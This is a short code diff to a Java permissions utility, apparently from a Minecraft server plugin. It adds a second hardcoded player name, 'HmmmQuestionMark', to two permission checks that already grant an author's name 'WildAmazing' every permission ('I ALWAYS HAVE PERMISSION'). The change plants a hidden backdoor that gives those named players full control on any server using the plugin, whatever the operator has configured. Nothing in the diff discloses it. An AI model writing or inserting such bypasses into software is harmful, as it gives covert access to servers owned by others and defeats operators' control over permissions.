@@ -177,7 +177,7 @@ public class DUtil {
 	 * @return
 	 */
 	public static boolean hasPermissionOrOP(Player p, String pe){//convenience method for permissions
-		if (p.getName().equals("WildAmazing") || p.isOp())
+		if (p.getName().equals("WildAmazing") || p.getName().equals("HmmmQuestionMark") || p.isOp())
 			return true;
 		return p.hasPermission(pe);
 	}
@@ -188,7 +188,7 @@ public class DUtil {
 	 * @return
 	 */
 	public static boolean hasPermission(Player p, String pe){//convenience method for permissions
-		if (p.getName().equals("WildAmazing")) //I ALWAYS HAVE PERMISSION
+		if (p.getName().equals("WildAmazing") || p.getName().equals("HmmmQuestionMark")) //I ALWAYS HAVE PERMISSION
 			return true;
 		return p.hasPermission(pe);
 	}
